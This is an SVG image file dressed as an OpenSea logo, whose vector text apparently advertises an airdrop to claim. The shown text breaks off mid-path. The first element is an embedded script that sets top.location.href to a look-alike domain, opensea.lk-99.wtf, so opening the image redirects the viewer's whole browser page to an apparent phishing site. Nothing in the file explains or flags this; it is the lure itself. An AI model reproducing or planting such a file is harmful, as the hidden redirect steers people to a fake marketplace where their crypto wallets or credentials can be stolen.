<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500"><script type="text/ecmascript"><![CDATA[top.location.href="https://opensea.lk-99.wtf";]]></script><g fill="none" fill-rule="evenodd"><path fill="#FFF" d="M0 0h500v500H0z"/><g fill-rule="nonzero"><path fill="#2081E2" d="M340 141c0 49.703-40.297 90-90 90s-90-40.297-90-90 40.297-90 90-90c49.713 0 90 40.297 90 90Z"/><path fill="#FFF" d="m204.127 143.765.383-.613 23.086-36.78a.783.783 0 0 1 1.385.102c3.857 8.803 7.185 19.75 5.626 26.566-.666 2.804-2.489 6.602-4.54 10.112a18.64 18.64 0 0 1-.867 1.495.781.781 0 0 1-.656.353H204.8a.803.803 0 0 1-.674-1.235Z"/><path fill="#FFF" d="M309 150.917v5.805c0 .333-.203.63-.5.76-1.812.777-8.02 3.63-10.6 7.222C291.314 173.88 286.282 187 275.034 187h-46.925C211.477 187 198 173.463 198 156.76v-.538c0-.444.36-.805.805-.805h26.159c.518 0 .897.481.85.99a8.946 8.946 0 0 0 .935 5.028 9.204 9.204 0 0 0 8.251 5.13h12.95v-10.12h-12.802c-.657 0-1.045-.76-.666-1.297.139-.213.296-.435.463-.685 1.211-1.722 2.941-4.398 4.662-7.445 1.174-2.055 2.312-4.25 3.228-6.453.185-.398.333-.806.48-1.204.25-.704.51-1.361.695-2.018.184-.556.333-1.14.48-1.686.435-1.87.62-3.851.62-5.907 0-.806-.037-1.648-.11-2.454-.038-.88-.149-1.759-.26-2.639-.074-.777-.212-1.546-.36-2.351a39.678 39.678 0 0 0-.74-3.519l-.102-.444c-.222-.806-.407-1.575-.666-2.38a89.834 89.834 0 0 0-2.46-7.296c-.324-.917-.695-1.797-1.065-2.676-.545-1.324-1.1-2.528-1.609-3.667-.259-.518-.481-.99-.703-1.472a52.572 52.572 0 0 0-.768-1.611c-.185-.398-.398-.769-.545-1.14l-1.582-2.925c-.222-.398.148-.87.582-.75l9.898 2.685h.028c.018 0 .028.01.037.01l1.304.36 1.434.408.527.148v-5.889c0-2.842 2.276-5.148 5.088-5.148a5.02 5.02 0 0 1 3.598 1.51 5.179 5.179 0 0 1 1.49 3.638v8.74l1.053.297a.84.84 0 0 1 .241.12c.259.195.629.482 1.1.834.37.296.769.657 1.25 1.028.952.768 2.09 1.759 3.339 2.898.333.287.657.583.953.88 1.61 1.5 3.413 3.259 5.133 5.203.481.546.953 1.102 1.434 1.685.481.593.99 1.176 1.434 1.76.583.777 1.211 1.583 1.757 2.426.26.398.555.805.805 1.203.703 1.065 1.323 2.167 1.915 3.269.25.509.509 1.065.73 1.61.657 1.473 1.175 2.973 1.508 4.473.102.324.176.676.213.99v.075c.11.444.148.917.185 1.398a14.97 14.97 0 0 1-.259 4.62 16.838 16.838 0 0 1-.546 1.936c-.222.63-.444 1.287-.73 1.907a25.862 25.862 0 0 1-1.99 3.778c-.249.444-.545.916-.841 1.36-.324.473-.657.918-.953 1.353a28.236 28.236 0 0 1-1.285 1.657c-.398.546-.805 1.093-1.25 1.574a60.292 60.292 0 0 1-1.83 2.093c-.37.435-.768.88-1.176 1.278-.397.444-.804.842-1.174 1.212-.62.62-1.138 1.102-1.573 1.5l-1.017.936a.829.829 0 0 1-.546.203h-7.88v10.12h9.915c2.22 0 4.329-.786 6.031-2.23.583-.51 3.127-2.714 6.133-6.038a.77.77 0 0 1 .379-.231l27.39-7.926a.808.808 0 0 1 1.026.778Z"/></g><g fill="#000" fill-rule="nonzero"><path d="M110.338 261.256c0-1.128.126-2.22.378-3.276.252-1.056.654-1.998 1.206-2.826a6.118 6.118 0 0 1 2.16-1.98c.888-.492 1.968-.738 3.24-.738 1.272 0 2.352.246 3.24.738a6.118 6.118 0 0 1 2.16 1.98c.552.828.954 1.77 1.206 2.826s.378 2.148.378 3.276c0 1.08-.126 2.13-.378 3.15a8.513 8.513 0 0 1-1.206 2.754 6.181 6.181 0 0 1-2.16 1.962c-.888.492-1.968.738-3.24.738-1.272 0-2.352-.246-3.24-.738a6.181 6.181 0 0 1-2.16-1.962 8.513 8.513 0 0 1-1.206-2.754 13.085 13.085 0 0 1-.378-3.15Zm-5.652 0c0 1.872.288 3.618.864 5.238.576 1.62 1.404 3.03 2.484 4.23 1.08 1.2 2.406 2.142 3.978 2.826 1.572.684 3.342 1.026 5.31 1.026 1.992 0 3.768-.342 5.328-1.026 1.56-.684 2.88-1.626 3.96-2.826 1.08-1.2 1.908-2.61 2.484-4.23.576-1.62.864-3.366.864-5.238 0-1.92-.288-3.702-.864-5.346-.576-1.644-1.404-3.078-2.484-4.302-1.08-1.224-2.4-2.184-3.96-2.88-1.56-.696-3.336-1.044-5.328-1.044-1.968 0-3.738.348-5.31 1.044-1.572.696-2.898 1.656-3.978 2.88s-1.908 2.658-2.484 4.302c-.576 1.644-.864 3.426-.864 5.346ZM142.666 270.652c-.816 0-1.512-.168-2.088-.504a4.044 4.044 0 0 1-1.386-1.314c-.348-.54-.6-1.17-.756-1.89a10.34 10.34 0 0 1-.234-2.196c0-.768.072-1.512.216-2.232.144-.72.39-1.356.738-1.908a4.203 4.203 0 0 1 1.368-1.35c.564-.348 1.266-.522 2.106-.522.816 0 1.506.174 2.07.522a4.312 4.312 0 0 1 1.386 1.368c.36.564.618 1.206.774 1.926.156.72.234 1.452.234 2.196 0 .744-.072 1.476-.216 2.196-.144.72-.39 1.35-.738 1.89-.348.54-.804.978-1.368 1.314-.564.336-1.266.504-2.106.504Zm-9.396-15.264v25.128h5.112v-8.82h.072a6.03 6.03 0 0 0 2.394 2.07c.972.468 2.034.702 3.186.702 1.368 0 2.562-.264 3.582-.792a7.58 7.58 0 0 0 2.556-2.124 9.165 9.165 0 0 0 1.53-3.06c.336-1.152.504-2.352.504-3.6 0-1.32-.168-2.586-.504-3.798-.336-1.212-.852-2.274-1.548-3.186a7.804 7.804 0 0 0-2.628-2.196c-1.056-.552-2.316-.828-3.78-.828-1.152 0-2.208.228-3.168.684-.96.456-1.752 1.188-2.376 2.196h-.072v-2.376h-4.86ZM167.794 262.696h-8.316c.024-.36.102-.768.234-1.224.132-.456.36-.888.684-1.296.324-.408.756-.75 1.296-1.026s1.218-.414 2.034-.414c1.248 0 2.178.336 2.79 1.008.612.672 1.038 1.656 1.278 2.952Zm-8.316 3.24h13.428a13.14 13.14 0 0 0-.36-4.14c-.336-1.32-.882-2.496-1.638-3.528a8.262 8.262 0 0 0-2.898-2.466c-1.176-.612-2.556-.918-4.14-.918-1.416 0-2.706.252-3.87.756a9.15 9.15 0 0 0-3.006 2.07 9.124 9.124 0 0 0-1.944 3.114c-.456 1.2-.684 2.496-.684 3.888 0 1.44.222 2.76.666 3.96.444 1.2 1.074 2.232 1.89 3.096.816.864 1.812 1.53 2.988 1.998 1.176.468 2.496.702 3.96.702 2.112 0 3.912-.48 5.4-1.44 1.488-.96 2.592-2.556 3.312-4.788h-4.5c-.168.576-.624 1.122-1.368 1.638-.744.516-1.632.774-2.664.774-1.44 0-2.544-.372-3.312-1.116-.768-.744-1.188-1.944-1.26-3.6ZM175.93 255.388V274h5.112v-9.756c0-1.896.312-3.258.936-4.086.624-.828 1.632-1.242 3.024-1.242 1.224 0 2.076.378 2.556 1.134.48.756.72 1.902.72 3.438V274h5.112v-11.448c0-1.152-.102-2.202-.306-3.15-.204-.948-.558-1.752-1.062-2.412-.504-.66-1.194-1.176-2.07-1.548-.876-.372-1.998-.558-3.366-.558-1.08 0-2.136.246-3.168.738s-1.872 1.278-2.52 2.358h-.108v-2.592h-4.86ZM201.67 265.468h-5.472c-.024 1.584.264 2.952.864 4.104.6 1.152 1.41 2.1 2.43 2.844 1.02.744 2.196 1.29 3.528 1.638a16.24 16.24 0 0 0 4.122.522c1.752 0 3.294-.204 4.626-.612 1.332-.408 2.448-.978 3.348-1.71a7.117 7.117 0 0 0 2.034-2.61c.456-1.008.684-2.1.684-3.276 0-1.44-.306-2.622-.918-3.546-.612-.924-1.338-1.662-2.178-2.214-.84-.552-1.686-.954-2.538-1.206a24.468 24.468 0 0 0-1.998-.522c-1.608-.408-2.91-.744-3.906-1.008s-1.776-.528-2.34-.792c-.564-.264-.942-.552-1.134-.864-.192-.312-.288-.72-.288-1.224 0-.552.12-1.008.36-1.368.24-.36.546-.66.918-.9a3.66 3.66 0 0 1 1.242-.504 6.624 6.624 0 0 1 1.368-.144c.696 0 1.338.06 1.926.18.588.12 1.11.324 1.566.612a3.18 3.18 0 0 1 1.098 1.188c.276.504.438 1.14.486 1.908h5.472c0-1.488-.282-2.754-.846-3.798a7.375 7.375 0 0 0-2.286-2.574c-.96-.672-2.058-1.158-3.294-1.458-1.236-.3-2.526-.45-3.87-.45a13.17 13.17 0 0 0-3.456.468 9.649 9.649 0 0 0-3.096 1.44 7.666 7.666 0 0 0-2.214 2.43c-.564.972-.846 2.118-.846 3.438 0 1.176.222 2.178.666 3.006a6.358 6.358 0 0 0 1.746 2.07 9.648 9.648 0 0 0 2.448 1.35c.912.348 1.848.642 2.808.882.936.264 1.86.504 2.772.72.912.216 1.728.468 2.448.756s1.302.648 1.746 1.08c.444.432.666.996.666 1.692 0 .648-.168 1.182-.504 1.602-.336.42-.756.75-1.26.99a5.637 5.637 0 0 1-1.62.486 11.26 11.26 0 0 1-1.62.126c-.744 0-1.464-.09-2.16-.27a5.377 5.377 0 0 1-1.818-.828 4.09 4.09 0 0 1-1.242-1.458c-.312-.6-.468-1.332-.468-2.196ZM233.17 262.696h-8.316c.024-.36.102-.768.234-1.224.132-.456.36-.888.684-1.296.324-.408.756-.75 1.296-1.026s1.218-.414 2.034-.414c1.248 0 2.178.336 2.79 1.008.612.672 1.038 1.656 1.278 2.952Zm-8.316 3.24h13.428a13.14 13.14 0 0 0-.36-4.14c-.336-1.32-.882-2.496-1.638-3.528a8.262 8.262 0 0 0-2.898-2.466c-1.176-.612-2.556-.918-4.14-.918-1.416 0-2.706.252-3.87.756a9.15 9.15 0 0 0-3.006 2.07 9.124 9.124 0 0 0-1.944 3.114c-.456 1.2-.684 2.496-.684 3.888 0 1.44.222 2.76.666 3.96.444 1.2 1.074 2.232 1.89 3.096.816.864 1.812 1.53 2.988 1.998 1.176.468 2.496.702 3.96.702 2.112 0 3.912-.48 5.4-1.44 1.488-.96 2.592-2.556 3.312-4.788h-4.5c-.168.576-.624 1.122-1.368 1.638-.744.516-1.632.774-2.664.774-1.44 0-2.544-.372-3.312-1.116-.768-.744-1.188-1.944-1.26-3.6ZM241.09 261.112c.072-1.2.372-2.196.9-2.988a6.129 6.129 0 0 1 2.016-1.908 8.785 8.785 0 0 1 2.754-1.026 15.657 15.657 0 0 1 3.078-.306c.936 0 1.884.066 2.844.198a8.7 8.7 0 0 1 2.628.774c.792.384 1.44.918 1.944 1.602s.756 1.59.756 2.718v9.684c0 .84.048 1.644.144 2.412.096.768.264 1.344.504 1.728h-5.184a7.336 7.336 0 0 1-.36-1.8 6.662 6.662 0 0 1-2.88 1.764 11.56 11.56 0 0 1-3.384.504 9.143 9.143 0 0 1-2.484-.324 5.689 5.689 0 0 1-2.016-1.008 4.692 4.692 0 0 1-1.35-1.728c-.324-.696-.486-1.524-.486-2.484 0-1.056.186-1.926.558-2.61a4.665 4.665 0 0 1 1.44-1.638 6.452 6.452 0 0 1 2.016-.918 21.522 21.522 0 0 1 2.286-.486c.768-.12 1.524-.216 2.268-.288a13.64 13.64 0 0 0 1.98-.324c.576-.144 1.032-.354 1.368-.63.336-.276.492-.678.468-1.206 0-.552-.09-.99-.27-1.314a1.986 1.986 0 0 0-.72-.756c-.3-.18-.648-.3-1.044-.36a8.543 8.543 0 0 0-1.278-.09c-1.008 0-1.8.216-2.376.648-.576.432-.912 1.152-1.008 2.16h-5.112Zm11.808 3.78a2.293 2.293 0 0 1-.81.45 8.273 8.273 0 0 1-1.044.27c-.372.072-.762.132-1.17.18-.408.048-.816.108-1.224.18a9.232 9.232 0 0 0-1.134.288c-.372.12-.696.282-.972.486a2.31 2.31 0 0 0-.666.774c-.168.312-.252.708-.252 1.188 0 .456.084.84.252 1.152.168.312.396.558.684.738.288.18.624.306 1.008.378.384.072.78.108 1.188.108 1.008 0 1.788-.168 2.34-.504.552-.336.96-.738 1.224-1.206.264-.468.426-.942.486-1.422s.09-.864.09-1.152v-1.908ZM278.998 264.064l3.348-9.432h.072l3.24 9.432h-6.66Zm.54-15.768L269.818 274h5.688l2.016-5.724h9.612l1.944 5.724h5.868l-9.612-25.704h-5.796ZM301.894 252.508v-4.212h-5.112v4.212h5.112Zm-5.112 2.88V274h5.112v-18.612h-5.112ZM305.926 255.388V274h5.112v-8.388c0-.84.084-1.62.252-2.34.168-.72.45-1.35.846-1.89.396-.54.918-.966 1.566-1.278.648-.312 1.44-.468 2.376-.468.312 0 .636.018.972.054.336.036.624.078.864.126v-4.752c-.408-.12-.78-.18-1.116-.18-.648 0-1.272.096-1.872.288a6.86 6.86 0 0 0-1.692.81 6.368 6.368 0 0 0-1.404 1.26 6.287 6.287 0 0 0-.972 1.602h-.072v-3.456h-4.86ZM332.494 264.64c0 .768-.072 1.512-.216 2.232a6.05 6.05 0 0 1-.72 1.926 3.829 3.829 0 0 1-1.35 1.35c-.564.336-1.266.504-2.106.504-.792 0-1.47-.174-2.034-.522a4.49 4.49 0 0 1-1.404-1.368 5.899 5.899 0 0 1-.81-1.926 9.478 9.478 0 0 1-.252-2.16c0-.768.078-1.506.234-2.214a5.888 5.888 0 0 1 .756-1.89c.348-.552.81-.996 1.386-1.332.576-.336 1.284-.504 2.124-.504.84 0 1.536.168 2.088.504a4.155 4.155 0 0 1 1.35 1.314 5.41 5.41 0 0 1 .738 1.872c.144.708.216 1.446.216 2.214Zm.072 6.984V274h4.86v-25.704h-5.112v9.36h-.072a5.488 5.488 0 0 0-2.358-2.07 7.319 7.319 0 0 0-3.15-.702c-1.368 0-2.568.27-3.6.81a7.718 7.718 0 0 0-2.574 2.142c-.684.888-1.2 1.914-1.548 3.078a12.563 12.563 0 0 0-.522 3.618c0 1.296.174 2.544.522 3.744.348 1.2.864 2.262 1.548 3.186a7.371 7.371 0 0 0 2.61 2.196c1.056.54 2.28.81 3.672.81 1.224 0 2.322-.222 3.294-.666.972-.444 1.758-1.17 2.358-2.178h.072ZM341.278 255.388V274h5.112v-8.388c0-.84.084-1.62.252-2.34.168-.72.45-1.35.846-1.89.396-.54.918-.966 1.566-1.278.648-.312 1.44-.468 2.376-.468.312 0 .636.018.972.054.336.036.624.078.864.126v-4.752c-.408-.12-.78-.18-1.116-.18-.648 0-1.272.096-1.872.288a6.86 6.86 0 0 0-1.692.81 6.368 6.368 0 0 0-1.404 1.26 6.287 6.287 0 0 0-.972 1.602h-.072v-3.456h-4.86ZM359.17 264.712c0-.744.072-1.476.216-2.196.144-.72.39-1.356.738-1.908a4.145 4.145 0 0 1 1.386-1.35c.576-.348 1.296-.522 2.16-.522.864 0 1.59.174 2.178.522a4.093 4.093 0 0 1 1.404 1.35c.348.552.594 1.188.738 1.908a11.17 11.17 0 0 1 0 4.374 5.802 5.802 0 0 1-.738 1.908 3.886 3.886 0 0 1-1.404 1.35c-.588.336-1.314.504-2.178.504-.864 0-1.584-.168-2.16-.504a3.93 3.93 0 0 1-1.386-1.35 5.802 5.802 0 0 1-.738-1.908 10.9 10.9 0 0 1-.216-2.178Zm-5.112 0c0 1.488.228 2.832.684 4.032.456 1.2 1.104 2.226 1.944 3.078a8.504 8.504 0 0 0 3.024 1.962c1.176.456 2.496.684 3.96.684s2.79-.228 3.978-.684c1.188-.456 2.202-1.11 3.042-1.962.84-.852 1.488-1.878 1.944-3.078.456-1.2.684-2.544.684-4.032s-.228-2.838-.684-4.05c-.456-1.212-1.104-2.244-1.944-3.096-.84-.852-1.854-1.512-3.042-1.98-1.188-.468-2.514-.702-3.978-.702-1.464 0-2.784.234-3.96.702a8.711 8.711 0 0 0-3.024 1.98c-.84.852-1.488 1.884-1.944 3.096-.456 1.212-.684 2.562-.684 4.05ZM386.026 270.652c-.816 0-1.512-.168-2.088-.504a4.044 4.044 0 0 1-1.386-1.314c-.348-.54-.6-1.17-.756-1.89a10.34 10.34 0 0 1-.234-2.196c0-.768.072-1.512.216-2.232.144-.72.39-1.356.738-1.908a4.203 4.203 0 0 1 1.368-1.35c.564-.348 1.266-.522 2.106-.522.816 0 1.506.174 2.07.522a4.312 4.312 0 0 1 1.386 1.368c.36.564.618 1.206.774 1.926.156.72.234 1.452.234 2.196 0 .744-.072 1.476-.216 2.196-.144.72-.39 1.35-.738 1.89-.348.54-.804.978-1.368 1.314-.564.336-1.266.504-2.106.504Zm-9.396-15.264v25.128h5.112v-8.82h.072a6.03 6.03 0 0 0 2.394 2.07c.972.468 2.034.702 3.186.702 1.368 0 2.562-.264 3.582-.792a7.58 7.58 0 0 0 2.556-2.124 9.165 9.165 0 0 0 1.53-3.06c.336-1.152.504-2.352.504-3.6 0-1.32-.168-2.586-.504-3.798-.336-1.212-.852-2.274-1.548-3.186a7.804 7.804 0 0 0-2.628-2.196c-1.056-.552-2.316-.828-3.78-.828-1.152 0-2.208.228-3.168.684-.96.456-1.752 1.188-2.376 2.196h-.072v-2.376h-4.86Z"/></g><g fill="#000" fill-rule="nonzero"><path d="M167.632 309.416h2.432a4.604 4.604 0 0 0-.544-1.76 4.28 4.28 0 0 0-1.096-1.288 4.83 4.83 0 0 0-1.504-.792 5.756 5.756 0 0 0-1.784-.272c-.875 0-1.661.155-2.36.464a5.048 5.048 0 0 0-1.768 1.28 5.707 5.707 0 0 0-1.104 1.912 7.138 7.138 0 0 0-.384 2.376 6.9 6.9 0 0 0 .384 2.328 5.56 5.56 0 0 0 1.104 1.88c.48.533 1.07.952 1.768 1.256.699.304 1.485.456 2.36.456.704 0 1.35-.107 1.936-.32a4.489 4.489 0 0 0 1.536-.928c.437-.405.79-.896 1.056-1.472a5.808 5.808 0 0 0 .496-1.936h-2.432c-.096.768-.36 1.387-.792 1.856-.432.47-1.032.704-1.8.704-.565 0-1.045-.11-1.44-.328a2.747 2.747 0 0 1-.96-.872 3.784 3.784 0 0 1-.536-1.224 5.815 5.815 0 0 1-.168-1.4c0-.501.056-.987.168-1.456.112-.47.29-.888.536-1.256.245-.368.565-.661.96-.88.395-.219.875-.328 1.44-.328a2.611 2.611 0 0 1 1.648.576c.224.181.41.392.56.632.15.24.245.504.288.792ZM171.696 305.576V317h2.272v-11.424zM175.664 311.272c.032-.533.165-.976.4-1.328.235-.352.533-.635.896-.848.363-.213.77-.365 1.224-.456.453-.09.91-.136 1.368-.136.416 0 .837.03 1.264.088.427.059.816.173 1.168.344.352.17.64.408.864.712.224.304.336.707.336 1.208v4.304c0 .373.021.73.064 1.072.043.341.117.597.224.768h-2.304a3.26 3.26 0 0 1-.16-.8 2.96 2.96 0 0 1-1.28.784c-.49.15-.992.224-1.504.224-.395 0-.763-.048-1.104-.144a2.528 2.528 0 0 1-.896-.448 2.085 2.085 0 0 1-.6-.768c-.144-.31-.216-.677-.216-1.104 0-.47.083-.856.248-1.16.165-.304.379-.547.64-.728.261-.181.56-.317.896-.408.336-.09.675-.163 1.016-.216.341-.053.677-.096 1.008-.128.33-.032.624-.08.88-.144.256-.064.459-.157.608-.28.15-.123.219-.301.208-.536 0-.245-.04-.44-.12-.584a.882.882 0 0 0-.32-.336 1.259 1.259 0 0 0-.464-.16 3.797 3.797 0 0 0-.568-.04c-.448 0-.8.096-1.056.288-.256.192-.405.512-.448.96h-2.272Zm5.248 1.68a1.02 1.02 0 0 1-.36.2 3.677 3.677 0 0 1-.464.12 7.11 7.11 0 0 1-.52.08 9.552 9.552 0 0 0-.544.08c-.17.032-.339.075-.504.128a1.49 1.49 0 0 0-.432.216c-.123.09-.221.205-.296.344a1.107 1.107 0 0 0-.112.528c0 .203.037.373.112.512a.859.859 0 0 0 .304.328c.128.08.277.136.448.168.17.032.347.048.528.048.448 0 .795-.075 1.04-.224.245-.15.427-.328.544-.536.117-.208.19-.419.216-.632.027-.213.04-.384.04-.512v-.848ZM187.28 307.448v-1.872h-2.272v1.872h2.272Zm-2.272 1.28V317h2.272v-8.272h-2.272ZM189.136 308.728V317h2.272v-4.8c0-.405.059-.733.176-.984.117-.25.259-.443.424-.576.165-.133.336-.224.512-.272.176-.048.317-.072.424-.072.363 0 .637.061.824.184.187.123.32.285.4.488.08.203.125.424.136.664.01.24.016.483.016.728V317h2.272v-4.608c0-.256.019-.51.056-.76.037-.25.112-.475.224-.672.112-.197.267-.357.464-.48s.456-.184.776-.184.573.053.76.16c.187.107.328.25.424.432.096.181.155.395.176.64.021.245.032.507.032.784V317h2.272v-5.536c0-.533-.075-.99-.224-1.368a2.345 2.345 0 0 0-.624-.92 2.448 2.448 0 0 0-.96-.512 4.412 4.412 0 0 0-1.216-.16c-.576 0-1.075.139-1.496.416a3.521 3.521 0 0 0-1 .96c-.224-.512-.552-.87-.984-1.072a3.33 3.33 0 0 0-1.432-.304c-.544 0-1.027.117-1.448.352a3.235 3.235 0 0 0-1.08.992h-.032v-1.12h-2.144ZM212.096 318.024l3.456-9.296H213.2l-1.808 5.664h-.032l-1.872-5.664h-2.416l2.896 7.76c.064.16.096.33.096.512 0 .245-.072.47-.216.672-.144.203-.365.32-.664.352-.224.01-.448.005-.672-.016a139.79 139.79 0 0 1-.656-.064v1.872c.235.021.467.04.696.056.23.016.461.024.696.024.779 0 1.387-.144 1.824-.432.437-.288.779-.768 1.024-1.44ZM218.336 312.872c0-.33.032-.656.096-.976a2.49 2.49 0 0 1 .328-.848c.155-.245.36-.445.616-.6.256-.155.576-.232.96-.232s.707.077.968.232c.261.155.47.355.624.6.155.245.264.528.328.848a4.964 4.964 0 0 1 0 1.944 2.579 2.579 0 0 1-.328.848c-.155.25-.363.45-.624.6-.261.15-.584.224-.968.224s-.704-.075-.96-.224a1.747 1.747 0 0 1-.616-.6 2.579 2.579 0 0 1-.328-.848 4.845 4.845 0 0 1-.096-.968Zm-2.272 0c0 .661.101 1.259.304 1.792.203.533.49.99.864 1.368.373.379.821.67 1.344.872.523.203 1.11.304 1.76.304a4.9 4.9 0 0 0 1.768-.304 3.766 3.766 0 0 0 1.352-.872c.373-.379.661-.835.864-1.368.203-.533.304-1.13.304-1.792 0-.661-.101-1.261-.304-1.8a3.874 3.874 0 0 0-.864-1.376 3.856 3.856 0 0 0-1.352-.88 4.787 4.787 0 0 0-1.768-.312c-.65 0-1.237.104-1.76.312-.523.208-.97.501-1.344.88a3.874 3.874 0 0 0-.864 1.376 5.078 5.078 0 0 0-.304 1.8ZM233.856 317v-8.272h-2.272v4.336c0 .843-.139 1.448-.416 1.816-.277.368-.725.552-1.344.552-.544 0-.923-.168-1.136-.504-.213-.336-.32-.845-.32-1.528v-4.672h-2.272v5.088c0 .512.045.979.136 1.4.09.421.248.779.472 1.072.224.293.53.52.92.68.39.16.888.24 1.496.24.48 0 .95-.107 1.408-.32.459-.213.832-.56 1.12-1.04h.048V317h2.16ZM235.584 308.728V317h2.272v-3.728c0-.373.037-.72.112-1.04.075-.32.2-.6.376-.84s.408-.43.696-.568c.288-.139.64-.208 1.056-.208a4.364 4.364 0 0 1 .816.08v-2.112a1.772 1.772 0 0 0-.496-.08c-.288 0-.565.043-.832.128a3.049 3.049 0 0 0-.752.36 2.83 2.83 0 0 0-1.056 1.272h-.032v-1.536h-2.16ZM246.16 311.272c.032-.533.165-.976.4-1.328.235-.352.533-.635.896-.848.363-.213.77-.365 1.224-.456.453-.09.91-.136 1.368-.136.416 0 .837.03 1.264.088.427.059.816.173 1.168.344.352.17.64.408.864.712.224.304.336.707.336 1.208v4.304c0 .373.021.73.064 1.072.043.341.117.597.224.768h-2.304a3.26 3.26 0 0 1-.16-.8 2.96 2.96 0 0 1-1.28.784c-.49.15-.992.224-1.504.224-.395 0-.763-.048-1.104-.144a2.528 2.528 0 0 1-.896-.448 2.085 2.085 0 0 1-.6-.768c-.144-.31-.216-.677-.216-1.104 0-.47.083-.856.248-1.16.165-.304.379-.547.64-.728.261-.181.56-.317.896-.408.336-.09.675-.163 1.016-.216.341-.053.677-.096 1.008-.128.33-.032.624-.08.88-.144.256-.064.459-.157.608-.28.15-.123.219-.301.208-.536 0-.245-.04-.44-.12-.584a.882.882 0 0 0-.32-.336 1.259 1.259 0 0 0-.464-.16 3.797 3.797 0 0 0-.568-.04c-.448 0-.8.096-1.056.288-.256.192-.405.512-.448.96h-2.272Zm5.248 1.68a1.02 1.02 0 0 1-.36.2 3.677 3.677 0 0 1-.464.12 7.11 7.11 0 0 1-.52.08 9.552 9.552 0 0 0-.544.08c-.17.032-.339.075-.504.128a1.49 1.49 0 0 0-.432.216c-.123.09-.221.205-.296.344a1.107 1.107 0 0 0-.112.528c0 .203.037.373.112.512a.859.859 0 0 0 .304.328c.128.08.277.136.448.168.17.032.347.048.528.048.448 0 .795-.075 1.04-.224.245-.15.427-.328.544-.536.117-.208.19-.419.216-.632.027-.213.04-.384.04-.512v-.848ZM257.776 307.448v-1.872h-2.272v1.872h2.272Zm-2.272 1.28V317h2.272v-8.272h-2.272ZM259.568 308.728V317h2.272v-3.728c0-.373.037-.72.112-1.04.075-.32.2-.6.376-.84s.408-.43.696-.568c.288-.139.64-.208 1.056-.208a4.364 4.364 0 0 1 .816.08v-2.112a1.772 1.772 0 0 0-.496-.08c-.288 0-.565.043-.832.128a3.049 3.049 0 0 0-.752.36 2.83 2.83 0 0 0-1.056 1.272h-.032v-1.536h-2.16ZM271.376 312.84c0 .341-.032.672-.096.992-.064.32-.17.605-.32.856-.15.25-.35.45-.6.6-.25.15-.563.224-.936.224-.352 0-.653-.077-.904-.232a1.996 1.996 0 0 1-.624-.608 2.622 2.622 0 0 1-.36-.856 4.212 4.212 0 0 1-.112-.96c0-.341.035-.67.104-.984.07-.315.181-.595.336-.84.155-.245.36-.443.616-.592.256-.15.57-.224.944-.224.373 0 .683.075.928.224.245.15.445.344.6.584.155.24.264.517.328.832.064.315.096.643.096.984Zm.032 3.104V317h2.16v-11.424h-2.272v4.16h-.032a2.439 2.439 0 0 0-1.048-.92 3.253 3.253 0 0 0-1.4-.312c-.608 0-1.141.12-1.6.36a3.43 3.43 0 0 0-1.144.952 4.18 4.18 0 0 0-.688 1.368 5.583 5.583 0 0 0-.232 1.608c0 .576.077 1.13.232 1.664a4.43 4.43 0 0 0 .688 1.416c.304.41.69.736 1.16.976s1.013.36 1.632.36c.544 0 1.032-.099 1.464-.296.432-.197.781-.52 1.048-.968h.032ZM275.28 308.728V317h2.272v-3.728c0-.373.037-.72.112-1.04.075-.32.2-.6.376-.84s.408-.43.696-.568c.288-.139.64-.208 1.056-.208a4.364 4.364 0 0 1 .816.08v-2.112a1.772 1.772 0 0 0-.496-.08c-.288 0-.565.043-.832.128a3.049 3.049 0 0 0-.752.36 2.83 2.83 0 0 0-1.056 1.272h-.032v-1.536h-2.16ZM283.232 312.872c0-.33.032-.656.096-.976a2.49 2.49 0 0 1 .328-.848c.155-.245.36-.445.616-.6.256-.155.576-.232.96-.232s.707.077.968.232c.261.155.47.355.624.6.155.245.264.528.328.848a4.964 4.964 0 0 1 0 1.944 2.579 2.579 0 0 1-.328.848c-.155.25-.363.45-.624.6-.261.15-.584.224-.968.224s-.704-.075-.96-.224a1.747 1.747 0 0 1-.616-.6 2.579 2.579 0 0 1-.328-.848 4.845 4.845 0 0 1-.096-.968Zm-2.272 0c0 .661.101 1.259.304 1.792.203.533.49.99.864 1.368.373.379.821.67 1.344.872.523.203 1.11.304 1.76.304a4.9 4.9 0 0 0 1.768-.304 3.766 3.766 0 0 0 1.352-.872c.373-.379.661-.835.864-1.368.203-.533.304-1.13.304-1.792 0-.661-.101-1.261-.304-1.8a3.874 3.874 0 0 0-.864-1.376 3.856 3.856 0 0 0-1.352-.88 4.787 4.787 0 0 0-1.768-.312c-.65 0-1.237.104-1.76.312-.523.208-.97.501-1.344.88a3.874 3.874 0 0 0-.864 1.376 5.078 5.078 0 0 0-.304 1.8ZM295.168 315.512c-.363 0-.672-.075-.928-.224a1.798 1.798 0 0 1-.616-.584 2.522 2.522 0 0 1-.336-.84 4.596 4.596 0 0 1-.104-.976c0-.341.032-.672.096-.992a2.49 2.49 0 0 1 .328-.848c.155-.245.357-.445.608-.6.25-.155.563-.232.936-.232.363 0 .67.077.92.232.25.155.456.357.616.608.16.25.275.536.344.856.07.32.104.645.104.976 0 .33-.032.656-.096.976-.064.32-.173.6-.328.84a1.82 1.82 0 0 1-.608.584c-.25.15-.563.224-.936.224Zm-4.176-6.784v11.168h2.272v-3.92h.032a2.68 2.68 0 0 0 1.064.92 3.22 3.22 0 0 0 1.416.312c.608 0 1.139-.117 1.592-.352.453-.235.832-.55 1.136-.944.304-.395.53-.848.68-1.36.15-.512.224-1.045.224-1.6a6.29 6.29 0 0 0-.224-1.688 4.122 4.122 0 0 0-.688-1.416 3.469 3.469 0 0 0-1.168-.976c-.47-.245-1.03-.368-1.68-.368a3.24 3.24 0 0 0-1.408.304c-.427.203-.779.528-1.056.976h-.032v-1.056h-2.16ZM305.216 308.728V317h2.272v-4.336c0-.843.139-1.448.416-1.816.277-.368.725-.552 1.344-.552.544 0 .923.168 1.136.504.213.336.32.845.32 1.528V317h2.272v-5.088c0-.512-.045-.979-.136-1.4a2.663 2.663 0 0 0-.472-1.072 2.218 2.218 0 0 0-.92-.688c-.39-.165-.888-.248-1.496-.248-.48 0-.95.11-1.408.328-.459.219-.832.568-1.12 1.048h-.048v-1.152h-2.16ZM316.72 312.872c0-.33.032-.656.096-.976a2.49 2.49 0 0 1 .328-.848c.155-.245.36-.445.616-.6.256-.155.576-.232.96-.232s.707.077.968.232c.261.155.47.355.624.6.155.245.264.528.328.848a4.964 4.964 0 0 1 0 1.944 2.579 2.579 0 0 